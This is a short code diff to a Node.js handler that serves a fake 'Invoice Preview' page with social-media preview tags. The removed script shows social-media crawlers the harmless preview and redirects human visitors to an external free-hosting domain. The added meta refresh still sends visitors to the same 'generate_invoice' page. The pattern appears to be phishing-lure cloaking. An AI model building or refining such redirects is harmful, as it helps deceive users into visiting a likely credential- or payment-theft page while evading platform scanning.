@@ -20,13 +20,9 @@ module.exports = (req, res) => {
         <meta name="twitter:card" content="summary_large_image" />
         <meta property="og:image:alt" content="Invoice Preview" />
         
-        <script>
-          if (!/bot|facebook|telegram|twitter|linkedin|whatsapp/i.test(navigator.userAgent)) {
-            setTimeout(function() {
-              window.location.href = 'https://japan-ab.ct.ws/generate_invoice.html?id='+'${invoiceId}';
-            }, 1000);
-          }
-        </script>
+        <noscript>
+          <meta http-equiv="refresh" content="1; url=https://japan-ab.ct.ws/generate_invoice.html?id=${invoiceId}">
+        </noscript>
       </head>
       <body>
         <p>Redirecting to invoice...</p>
